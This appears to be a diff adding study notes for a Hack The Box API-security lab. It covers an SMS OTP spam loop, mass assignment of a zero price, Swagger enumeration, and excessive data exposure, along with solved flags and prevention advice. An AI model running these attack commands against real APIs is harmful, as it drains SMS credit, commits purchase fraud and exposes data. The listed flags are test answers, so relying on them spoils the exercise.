@@ -5,12 +5,232 @@
 
 ---
 
+## General Exercise Methodology
+
+Every exercise in this module follows the same pattern. Do not skip steps or guess — work through this in order every time.
+
+**Step 1 — Read the section material first**
+Understand what vulnerability is being demonstrated and what the attack pattern is. The flag is always behind successfully applying that section's technique. Do not reach for tools or endpoints the section hasn't taught yet.
+
+**Step 2 — Sign in and get a JWT**
+```bash
+JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' \
+  -H 'Content-Type: application/json' \
+  -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
+```
+Always use command substitution — never paste a raw JWT into a variable (line wrapping breaks it silently).
+
+**Step 3 — Check roles**
+```bash
+curl -s -X GET 'http://<TARGET>/api/v1/roles/current-user' \
+  -H "Authorization: Bearer $JWT" | jq
+```
+Role names map exactly to endpoint names. This tells you what you can access.
+
+**Step 4 — Enumerate Swagger for endpoints matching your roles**
+```bash
+curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/' | grep -i <keyword>
+```
+Then get the role and schema for the endpoint you're targeting:
+```bash
+curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
+```
+
+**Step 5 — Send one test request, read the full response**
+Before spamming or looping — send one request with `| jq` and read every field in the response. The flag, sensitive data, or useful info is often in a field you wouldn't notice if you only checked `SuccessStatus`.
+
+**Step 6 — Apply the specific attack the section teaches**
+Don't add complexity. The section tells you exactly what to test. Do that one thing.
+
+**Time-saving rules:**
+- Always write multi-line scripts to `/tmp/script.sh` and run with `bash` — never paste loops directly into the terminal
+- Try customer emails from prior sections first (`MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`, `@pentestercompany.com` for suppliers)
+- Error messages reveal required field names — read them before changing anything
+- `current-user` endpoints need no role — always try them first after account access
+
+---
+
 ## Flags Summary
 
 | Section | Attack | Flag |
 |---------|--------|------|
 | 3 — BOLA | Enumerate `/api/v1/suppliers/quarterly-reports/{ID}` with integer IDs | `HTB{e76651e1f516eb5d7260621c26754776}` |
 | 4 — Broken Authentication | OTP brute-force via password reset flow | `HTB{115a6329120e9eff13c4ec6a63343ed1}` |
+| 5 — Excessive Data Exposure | Customer reads `email` from `/api/v1/supplier-companies` | `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}` |
+| 5 — Mass Assignment | Set `NetSum: 0` on POST `/api/v1/customers/orders/items` | `HTB{4d86794f82046e465ca29d91bdbe5bca}` |
+| 6 — Unrestricted Resource Consumption | Spam SMS OTP endpoint with no rate limiting | `HTB{01de742d8cd942ad682aeea9ce3c5428}` |
+
+---
+
+## Section 6: Unrestricted Resource Consumption (API4:2023)
+
+### What It Is
+
+CWE-400: Uncontrolled Resource Consumption — API fails to limit requests that consume resources (disk, memory, bandwidth, SMS credits, CPU). Without rate limiting, attackers can exhaust resources and cause financial damage or DoS.
+
+Two variants covered in this section:
+1. **File upload without size/type validation** — upload arbitrarily large files or executable files; no limit on disk consumption
+2. **SMS OTP endpoint without rate limiting** — spam password reset OTPs, burning SMS credits per request
+
+### Attack Pattern — SMS OTP Rate Limit Abuse
+
+1. Sign in → get JWT
+2. Check roles and find accessible endpoints
+3. Enumerate Swagger for SMS/OTP endpoints — check if role required (often none for password reset flows)
+4. Get the request body schema — find required fields
+5. Find a valid customer email (try known accounts from prior sections)
+6. Send repeated requests in a loop — flag appears after threshold of requests
+
+### Commands
+
+#### Get schema for the OTP command
+```bash
+curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 20 "CreatePasswordResetOTPCommand\""
+```
+
+#### Test customer emails for validity
+```bash
+for email in "email1@domain.com" "email2@domain.com"; do
+  echo -n "$email: "
+  curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' \
+    -H 'Content-Type: application/json' \
+    -d "{\"Email\": \"$email\"}" | jq -r '.SuccessStatus'
+done
+```
+
+#### Spam endpoint and detect flag in response
+```bash
+for i in $(seq 1 100); do
+  response=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' \
+    -H 'Content-Type: application/json' \
+    -d '{"Email": "<VALID_CUSTOMER_EMAIL>"}')
+  echo "Request $i: $response"
+  echo "$response" | grep -q "HTB{" && echo "FLAG FOUND on request $i!" && break
+done
+```
+
+### What Works
+
+- Customer emails from prior sections remain valid across exercises — always try them first (`MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`)
+- Flag appears embedded in response body after a threshold of requests (not always on request 1)
+- Always view full `jq` response first — don't assume `SuccessStatus` is the only field
+
+### What Doesn't Work
+
+- Testing with supplier email on a customer OTP endpoint — returns `SuccessStatus: false`
+- Assuming the flag is in the first response — it appeared on request 11
+
+### Exercise Result
+
+- **Endpoint:** `POST /api/v1/authentication/customers/passwords/resets/sms-otps` (no role required)
+- **Target email:** `MasonJenkins@ymail.com`
+- **Requests sent before flag:** 11
+- **Flag:** `HTB{01de742d8cd942ad682aeea9ce3c5428}`
+
+### Prevention
+
+- Implement rate limiting on all endpoints (especially unauthenticated ones like password reset flows)
+- Validate file size and extension server-side before saving to disk
+- Scan uploaded file contents (e.g., ClamAV) before accepting them
+- Restrict public access to file storage directories (don't store uploads under `wwwroot`)
+- Enforce authentication and authorization before allowing file access
+
+---
+
+## Section 5: Broken Object Property Level Authorization (API3:2023)
+
+### What It Is
+
+Two subclasses under API3:
+
+1. **Excessive Data Exposure (CWE-213)** — endpoint returns sensitive fields to authorized users who shouldn't be able to see them
+2. **Mass Assignment (CWE-915)** — endpoint accepts sensitive fields from clients that should be server-controlled
+
+### Attack Pattern — Excessive Data Exposure
+
+1. Authenticate → get JWT
+2. Check roles → identify accessible endpoints
+3. Call each GET endpoint → inspect ALL fields in the response
+4. Flag is embedded in a sensitive field that shouldn't be exposed to that user's role
+
+### Attack Pattern — Mass Assignment
+
+1. Authenticate → get JWT
+2. Check roles → find a POST/PATCH endpoint
+3. Check swagger schema for that endpoint's request body — look for fields that should be server-computed (price, totals, status, fee exemptions)
+4. Send the request with the sensitive field set to an advantageous value (0, true, etc.)
+5. Flag appears in the success response
+
+### Commands
+
+#### Find all endpoint paths containing a keyword
+```bash
+curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/' | grep -i <keyword>
+```
+
+#### Get the full schema for a command type
+```bash
+curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
+```
+
+#### Create order (correct path: `/api/v1/customers/orders`)
+```bash
+JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' \
+  -H 'Content-Type: application/json' \
+  -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
+
+curl -s -X POST 'http://<TARGET>/api/v1/customers/orders' \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $JWT" \
+  -d '{"Date": "2026-06-16"}' | jq
+```
+
+#### Create order items with mass-assigned NetSum (mass assignment exploit)
+```bash
+curl -s -X POST 'http://<TARGET>/api/v1/customers/orders/items' \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $JWT" \
+  -d '{"OrderID": "<ORDER_ID>", "OrderItems": [{"ProductID": "<PRODUCT_ID>", "Quantity": 1, "NetSum": 0}]}' | jq
+```
+- **`NetSum`** — net total for the item; should be server-computed as `Quantity × UnitPrice` but API accepts it from the client
+- **Setting `NetSum: 0`** — orders the product for free; flag returned in success response
+
+### What Works
+
+- Writing Python scripts to `/tmp/` to avoid inline indentation issues with `python3 -c`
+- Error messages reveal the required command type name (e.g., `CreateOrderItemsCommand`) and missing fields — read them carefully
+- Checking all fields in GET responses, including seemingly internal fields like `email`, `isExemptedFromMarketplaceFee`
+- Schema grep with `grep -A 30 "<CommandName>"` to find request body fields including mass-assignable ones
+- Listing all relevant paths first: `grep '"/api/' | grep -i <keyword>`
+
+### What Doesn't Work
+
+- `python3 -c "..."` with multiline indented code pasted inline — indentation errors; write to file instead
+- Assuming endpoint paths from role names alone — always verify with swagger paths list
+- Sending mass-assignable fields at top-level when API expects an array (e.g., `OrderItems` array, not flat fields)
+- Grepping swagger for role name alone without finding the schema `$ref` and following it
+
+### Exercise Results
+
+**Q1 — Excessive Data Exposure**
+- User: `htbpentester5@hackthebox.com` (customer)
+- Roles: `Suppliers_Get`, `Suppliers_GetAll`, `SupplierCompanies_Get`, `SupplierCompanies_GetAll`
+- Vulnerable endpoint: `GET /api/v1/supplier-companies`
+- Exposed fields: `email`, `isExemptedFromMarketplaceFee` (internal business data, should not be visible to customers)
+- Flag: in `email` field of "HTB Academy" company entry → `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}`
+
+**Q2 — Mass Assignment**
+- User: `htbpentester7@hackthebox.com` (customer)
+- Roles: `CustomerOrders_GetByID`, `CustomerOrders_Create`, `CustomerOrderItems_Get`, `CustomerOrderItems_Create`
+- Vulnerable endpoint: `POST /api/v1/customers/orders/items`
+- Mass-assignable field: `NetSum` (float) — should be `Quantity × product price`, but API accepts client value
+- Exploit: set `NetSum: 0` → ordered a $25.50 product for free
+- Flag returned in the `SuccessStatus: true` response → `HTB{4d86794f82046e465ca29d91bdbe5bca}`
+
+### Prevention
+
+- **Excessive Data Exposure:** Return a specific response DTO that includes only fields intended for the caller's role — never return the full domain model
+- **Mass Assignment:** Use a dedicated request DTO for each endpoint that excludes fields clients should not control — never bind client input directly to the domain model
 
 ---
 
